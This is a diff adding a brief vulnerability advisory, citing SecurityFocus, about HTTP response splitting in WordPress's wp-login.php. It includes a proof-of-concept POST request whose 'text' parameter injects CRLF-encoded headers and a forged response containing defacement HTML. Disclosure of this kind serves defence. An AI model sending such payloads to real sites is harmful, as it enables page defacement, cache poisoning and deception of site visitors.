@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/11348/info
+
+Wordpress is reported prone to a HTTP response splitting vulnerability. The issue presents itself due to a flaw in the affected script that allows an attacker to manipulate how GET requests are handled.
+
+A remote attacker may exploit this vulnerability to influence or misrepresent how web content is served, cached or interpreted. This could aid in various attacks, which try to entice client users into a false sense of trust.
+
+POST /wp-login.php HTTP/1.0
+Host: HOSTNAME
+Content-Type: application/x-www-form-urlencoded
+Content-length: 226
+
+action=login&mode=profile&log=USER&pwd=PASS&text=
+%0d%0aConnection:%20Keep-Alive%0d%0aContent-Length:%20
+0%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Length:
+%2021%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>
+*defaced*</html>
